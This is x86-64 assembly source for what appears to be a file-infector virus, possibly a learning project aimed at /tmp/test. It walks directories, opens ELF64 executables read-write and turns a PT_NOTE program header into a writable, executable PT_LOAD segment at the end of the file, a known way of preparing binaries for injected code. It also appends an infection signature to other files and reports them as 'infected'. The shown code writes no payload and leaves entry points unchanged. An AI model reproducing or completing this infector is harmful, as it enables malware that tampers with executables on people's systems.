%include "include.s"
%include "utils.s"
%include "check_elf_64_exec.s"
%include "list_files_recursive.s"

; Syscall numbers for x86-64
%define SYS_WRITE       1
%define SYS_CLOSE       3

; Constants for file list storage

section .bss
    path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
    file_list:      resb MAX_FILES * FILE_ENTRY_SIZE  ; storage for file paths
    file_count:     resq 1                    ; number of files stored
    elf_header_buf: resb 64                   ; buffer for reading ELF header
    elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers
    sig_check_buf:  resb BUFFER_SIZE          ; buffer for checking signature

section .data
    newline:              db 10               ; newline character
    msg_valid:            db " is a valid elf64 executable", 10, 0
    msg_invalid:          db " is not a valid elf64 executable", 10, 0
    msg_add_pt_load:      db "add pt_load", 10, 0
    msg_infected:         db "infected ", 0
    msg_already_infected: db "already infected", 10, 0

section .text
global _start
global list_files_recursive

_start:
    ; Initialize file count to 0
    mov qword [rel file_count], 0
    
    mov rsi, firstDir           ; source = /tmp/test
    lea rdi, [rel path_buffer]  ; destination = path_buffer
    call print_string
    call str_copy
    ; Call list_files_recursive with path_buffer
    lea rdi, [rel path_buffer]
    call list_files_recursive
    
    ; Call check_elf64_exec with the file list
    lea rdi, [rel file_list]
    mov rsi, [rel file_count]
    call check_elf64_exec
    
    jmp _end


; ============================================
; add_pt_load(char *filepath)
; rdi = pointer to file path
; Converts a PT_NOTE segment to PT_LOAD in the ELF file,
; pointing to the end of the file with filesz/memsz = 0x1000
; ============================================
add_pt_load:
    push rbp
    mov rbp, rsp
    sub rsp, 32                 ; allocate local variable space
    push r12                    ; saved file path
    push r13                    ; saved file descriptor
    push r14                    ; saved e_phoff
    push r15                    ; saved e_phnum
    push rbx                    ; saved e_phentsize

    mov r12, rdi                ; r12 = file path

    ; Open the file for read/write
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12                ; pathname
    mov edx, O_RDWR             ; flags: read-write
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .add_pt_load_fail        ; if fd < 0, fail

    mov r13, rax                ; r13 = fd

    ; Get the file size using lseek to SEEK_END
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    mov edx, SEEK_END           ; whence = SEEK_END
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    mov [rbp-8], rax            ; save file size at [rbp-8]

    ; Seek back to beginning for reading ELF header
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    xor edx, edx                ; SEEK_SET = 0
    syscall

    ; Read the ELF header (64 bytes)
    mov eax, SYS_READ
    mov edi, r13d               ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; read 64 bytes
    syscall

    ; Check if we read enough bytes
    cmp rax, 64
    jl .add_pt_load_close_fail

    ; Get e_phoff (program header table offset) from ELF header at offset 32
    lea rdi, [rel elf_header_buf]
    mov r14, [rdi + e_phoff]    ; r14 = e_phoff

    ; Get e_phnum (number of program headers) from ELF header at offset 56
    movzx r15d, word [rdi + e_phnum]  ; r15 = e_phnum

    ; Get e_phentsize (size of each program header entry) from ELF header at offset 54
    movzx ebx, word [rdi + e_phentsize]  ; rbx = e_phentsize

    ; Seek to the program header table
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    mov rsi, r14                ; offset = e_phoff
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Read all existing program headers
    ; Calculate total size first: e_phnum * e_phentsize
    mov rax, r15                ; e_phnum
    imul rax, rbx               ; * e_phentsize
    mov rdx, rax                ; read size
    
    mov eax, SYS_READ
    mov edi, r13d               ; fd
    lea rsi, [rel elf_phdr_buf]
    syscall

    ; Find a PT_NOTE segment to convert to PT_LOAD
    lea rdi, [rel elf_phdr_buf]
    xor rcx, rcx                ; index counter
    mov [rbp-16], rcx           ; save index of found PT_NOTE (-1 if not found)
    dec qword [rbp-16]          ; set to -1 initially

.find_note_loop:
    cmp rcx, r15                ; compare with e_phnum
    jge .find_note_done

    ; Calculate offset to current phdr
    mov rax, rcx
    imul rax, rbx               ; * e_phentsize
    lea rsi, [rdi + rax]        ; rsi = pointer to current phdr

    ; Check if p_type == PT_NOTE (4)
    cmp dword [rsi + p_type], PT_NOTE
    jne .find_note_next

    ; Found PT_NOTE, save index
    mov [rbp-16], rcx
    jmp .find_note_done

.find_note_next:
    inc rcx
    jmp .find_note_loop

.find_note_done:
    ; Check if we found a PT_NOTE
    cmp qword [rbp-16], -1
    je .add_pt_load_close_fail  ; No PT_NOTE found, fail

    ; Get pointer to the PT_NOTE we're converting
    mov rcx, [rbp-16]           ; index of PT_NOTE
    mov rax, rcx
    imul rax, rbx               ; * e_phentsize
    lea rdi, [rel elf_phdr_buf]
    add rdi, rax                ; rdi = pointer to PT_NOTE phdr

    ; Convert PT_NOTE to PT_LOAD
    ; p_type = PT_LOAD (1)
    mov dword [rdi + p_type], PT_LOAD

    ; p_flags = PF_R | PF_W | PF_X (readable, writable, executable)
    mov dword [rdi + p_flags], PF_R | PF_W | PF_X

    ; p_offset = file size (end of current file)
    mov rax, [rbp-8]            ; get file size
    mov qword [rdi + p_offset], rax

    ; p_vaddr = Compute aligned virtual address
    ; We use a high address like 0xc000000 + aligned file offset
    mov rcx, rax                ; file size
    add rcx, 0xfff              ; align up to page boundary
    and rcx, ~0xfff             ; clear low 12 bits
    add rcx, 0xc000000          ; add base address offset
    mov qword [rdi + p_vaddr], rcx

    ; p_paddr = same as p_vaddr
    mov qword [rdi + p_paddr], rcx

    ; p_filesz = PT_LOAD_FILESZ (from include.s)
    mov qword [rdi + p_filesz], PT_LOAD_FILESZ

    ; p_memsz = PT_LOAD_MEMSZ (from include.s)
    mov qword [rdi + p_memsz], PT_LOAD_MEMSZ

    ; p_align = 0x1000 (4KB alignment)
    mov qword [rdi + p_align], 0x1000

    ; Seek to the program header table to write back the modified program headers
    ; (We don't modify e_phnum - just convert PT_NOTE to PT_LOAD)
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    mov rsi, r14                ; offset = e_phoff
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Write all program headers (with the modified one)
    ; Calculate total size first: e_phnum * e_phentsize
    mov rax, r15                ; e_phnum (original, not incremented)
    imul rax, rbx               ; * e_phentsize
    mov rdx, rax                ; write size

    mov eax, SYS_WRITE
    mov edi, r13d               ; fd
    lea rsi, [rel elf_phdr_buf]
    syscall

    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Print success message
    lea rdi, [rel msg_add_pt_load]
    call print_string

    jmp .add_pt_load_done

.add_pt_load_close_fail:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.add_pt_load_fail:
    ; No success message printed on failure

.add_pt_load_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    add rsp, 32                 ; deallocate local variable space
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; process_non_elf_file(char *filepath)
; rdi = pointer to file path
; Opens the file, searches for the signature string,
; if found: prints "already infected"
; if not found: appends signature and prints "infected " + filename
; ============================================
process_non_elf_file:
    push rbp
    mov rbp, rsp
    push r12                    ; saved file path
    push r13                    ; saved file descriptor
    push r14                    ; saved file size / bytes read
    push r15                    ; saved current position
    push rbx                    ; saved for temp use

    mov r12, rdi                ; r12 = file path

    ; Open the file for reading
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12                ; pathname
    xor edx, edx                ; O_RDONLY = 0
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .process_done            ; if fd < 0, just return

    mov r13, rax                ; r13 = fd

    ; Get file size using lseek
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    mov edx, SEEK_END           ; whence = SEEK_END
    syscall

    test rax, rax
    jle .process_close_and_append  ; if size <= 0, treat as not infected

    mov r14, rax                ; r14 = file size

    ; Seek back to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    xor edx, edx                ; SEEK_SET = 0
    syscall

    xor r15, r15                ; r15 = current position in file

.process_sig_read_loop:
    ; Read a chunk of the file
    mov eax, SYS_READ
    mov edi, r13d               ; fd
    lea rsi, [rel sig_check_buf]
    mov edx, BUFFER_SIZE        ; read BUFFER_SIZE bytes
    syscall

    ; Check if read failed or EOF
    test rax, rax
    jle .process_close_and_append  ; if bytes_read <= 0, not found

    mov rbx, rax                ; rbx = bytes_read

    ; Search for signature in the buffer
    lea rdi, [rel sig_check_buf]  ; buffer to search in
    mov rsi, rbx                  ; buffer length
    lea rdx, [rel signature]      ; signature to search for
    mov rcx, signature_len        ; signature length
    call search_substring

    ; If found (rax == 1), file is already infected
    test rax, rax
    jnz .process_already_infected

    ; Calculate overlap for next read (in case signature spans chunks)
    ; Seek back by (signature_len - 1) bytes to handle boundary cases
    add r15, rbx                ; update position
    cmp r15, r14                ; check if we've read the whole file
    jge .process_close_and_append

    ; Seek back slightly to handle signatures that span chunk boundaries
    ; Calculate new position: max(0, r15 - signature_len + 1)
    mov rsi, r15
    sub rsi, signature_len      ; go back by signature length
    add rsi, 1                  ; but keep 1 byte of progress
    
    ; Check for negative offset (shouldn't happen but be safe)
    test rsi, rsi
    js .process_close_and_append
    
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor edx, edx                ; SEEK_SET = 0
    syscall

    ; Check if lseek failed
    test rax, rax
    js .process_close_and_append

    mov r15, rax                ; update position to new seek position
    jmp .process_sig_read_loop

.process_already_infected:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Print "already infected"
    lea rdi, [rel msg_already_infected]
    call print_string
    jmp .process_done

.process_close_and_append:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Reopen file for appending (O_WRONLY | O_APPEND)
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12                ; pathname
    mov edx, O_WRONLY | O_APPEND  ; flags: write + append
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .process_done            ; if fd < 0, just return

    mov r13, rax                ; r13 = fd

    ; Write the signature to the file
    mov eax, SYS_WRITE
    mov edi, r13d               ; fd
    lea rsi, [rel signature]    ; signature string
    mov edx, signature_len      ; length of signature
    syscall

    ; Check if write failed
    test rax, rax
    js .process_write_failed    ; if write failed, close and return

    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Print "infected " + filename + newline
    lea rdi, [rel msg_infected]
    call print_string
    mov rdi, r12                ; filename
    call print_string
    ; Print newline
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel newline]
    mov edx, 1
    syscall
    jmp .process_done

.process_write_failed:
    ; Close the file on write failure
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.process_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret


_end:
  mov rdi, the_end
  call print_string
  mov eax, 60                 ; sys_exit
  xor edi, edi                ; status = 0
  syscall
